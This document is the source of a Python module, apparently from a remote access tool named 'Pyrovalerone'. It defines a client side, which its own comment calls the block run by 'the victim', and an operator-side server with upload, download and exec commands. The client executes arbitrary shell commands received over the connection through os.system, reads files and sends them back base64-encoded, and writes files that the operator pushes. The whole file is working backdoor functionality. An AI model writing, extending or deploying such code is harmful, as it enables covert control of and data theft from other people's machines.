"""
    Pyrovalerone
    Default OS Module
    Note: Features platform independant CRUD operations and code exection 
"""
import os
import base64
import BDProtocol
import BDFramework

""""
	@class ClientMain
	@brief The block that will be invoked by the client (victim)
"""
class ClientMain:

	def __init__(self, handler:BDProtocol):
		self.handler = handler
		self.conn = handler.conn
		self.cmdModules = ["upload", "download", "exec"]

	def registerCMDModules(self, modules:list):

		# Iterate over every module to registered
		for module in modules:
		
			# Register the module if necessary
			if module not in self.cmdModules:
				self.cmdModules.append(module)


	def runCMD(self, cmd:list):

		# If module does not exist execute it on the current system
		if cmd[0] not in self.cmdModules:
		   self.handler.send_msg("CMD_NOT_FOUND")

		# Get the command's function
		cmdFunction = getattr(self, cmd[0])

		# Run the command
		return cmdFunction(cmd)

	def upload(self, argv):

		# Receive remote file path to write to
		filename = self.handler.recv_msg()

		try:

			# Create file stream for writing
			targetFile = open(filename, 'wb') 
			
			# Receive data from client
			data = self.handler.recv_msg()
			
			# Decode data
			data = base64.b64decode(data.encode('ascii'))

			# Write data to file
			targetFile.write(data)

			# Close file
			targetFile.close()

		except Exception as exc:
			return 'CMD_FAIL: {}'.format(exc)

		return 'CMD_SUCCESS'

	def download(self, argv):
		
		# Receive remote file path to read from
		filename = self.handler.recv_msg()
		try:

			# Create file stream for reading
			data = open(filename, 'rb').read()
			# Encode data
			data = base64.b64encode(data)

			# Send data to client
			self.handler.send_msg(data)

		except Exception as exc:
			return 'CMD_FAIL: {}'.format(exc)

		return 'CMD_SUCCESS'

	def exec(self, argv):
		cmd = self.handler.recv_msg()
		try:
			os.system(cmd)
		except Exception as exc:
			return 'CMD_FAIL: {}'.format(exc)

		return 'CMD_SUCCESS'


class ServerMain:

	def __init__(self, handler):
		self.handler = handler
		self.conn = handler.conn
		self.cmdModules = ["upload", "download", "exec", "goodbye", "help"]
		self.buildIns = ["goodbye", "help"]
		self.cmdModuleHelp = {
			"upload": "Usage: upload [LFILE] [RFILE]",
			"download": "Usage: download [RFILE] [LFILE]",
			"exec": "Usage: exec [REMOTE SYSTEM COMMAND]",
			"goodbye": "Usage: Close connection"
		}

	def registerCMDHelp(self, cmd:str, usage:str):
		if cmd in self.cmdModules:
			if cmd not in self.cmdModuleHelp.keys():
				self.cmdModuleHelp[cmd] = usage

	def registerCMDBuiltIns(self, buildIns:list):
		for buildIn in buildIns:
			if buildIn not in self.buildIns:
				self.registerCMDModules([buildIn])
				self.buildIns.append(buildIn)

	def registerCMDModules(self, modules:list):
		for module in modules:
			if module not in self.cmdModules:
				self.cmdModules.append(module)

	def runCMD(self, cmd):

		# If module does not exist execute it on the current system
		if cmd[0] not in self.cmdModules:
			os.system(" ".join(cmd))
			return

		# Get the command's function
		cmdFunction = getattr(self, cmd[0])

		# If its not a build-in function
		if cmd[0] not in self.buildIns:

			# Notify victim of cmd to be executed
			self.handler.send_msg(cmd[0])

		# Run the command
		return cmdFunction(cmd)

	def upload(self, argv):

		if len(argv) < 3:
			return 'INVALID_ARGUMENT'

		LFILE = argv[1] # Local file

		RFILE = argv[2] # Remote file

		# Open lfile for reading
		DATA = open(LFILE, 'rb').read()

		# Encode data with base64
		DATA = base64.b64encode(DATA)
		
		# Send rfile name
		self.handler.send_msg(RFILE)

		# Send rfile data
		self.handler.send_msg(DATA)

		return self.handler.recv_msg()

	def download(self, argv):

		if len(argv) < 3:
			return 'INVALID_ARGUMENT'

		RFILE = argv[1] # Remote file

		LFILE = argv[2] # Local file

		# Send remote file name
		self.handler.send_msg(RFILE)

		# Receive file data
		DATA = self.handler.recv_msg()

		# Decode file data
		DATA = base64.b64decode(DATA)

		# Write data to file
		open(LFILE, 'wb').write(DATA)

		return self.handler.recv_msg()


	def exec(self, argv):

		if len(argv) < 2:
			return 'INVALID_ARGUMENT'

		command = argv[1]

		# Run command
		self.handler.send_msg(command)

		return self.handler.recv_msg()
		

	def goodbye(self, argv):
		self.conn.close()
		self.conn = None

	def help(self, argv):
		
		# If an argument was provided
		if len(argv) > 1:

			# If it is an existing module
			if argv[1] in self.cmdModules:

				# If a help page exists for the command
				if argv[1] in self.cmdModuleHelp.keys():

					# Print the usage
					print(self.cmdModuleHelp[argv[1]])

				# If no help page is available for this command
				else:
					print("{} has no manual page".format(argv[1]))

			# If the module does not exist
			else:
				print("No such module exists.")

		# If no arguments were provided
		else:

			print("Registered %d command modules: " % len(self.cmdModules))
			print("-" * 13)
			# Print all modules
			for module in self.cmdModules:
				print("-", module,"")